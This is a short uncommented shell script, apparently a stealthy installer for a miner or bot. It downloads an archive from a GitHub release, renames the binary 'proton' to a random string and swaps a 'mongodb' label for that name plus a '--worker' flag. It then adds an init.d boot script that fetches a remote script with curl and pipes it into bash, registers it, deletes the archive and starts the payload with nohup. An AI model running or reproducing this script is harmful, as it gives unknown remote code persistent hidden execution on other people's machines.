cd /
wget https://github.com/thermodynamicz/interference/releases/download/v1.5.0/electron.tar
tar -xvf electron.tar
cd /electron
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv proton $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./neutron.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/thermodynamicz/interference/main/field.sh)" > photon.sh
chmod a+x photon.sh
update-rc.d photon.sh defaults
rm -rf electron.tar
cd /electron
nohup ./neutron.sh
ps -ef | grep electron
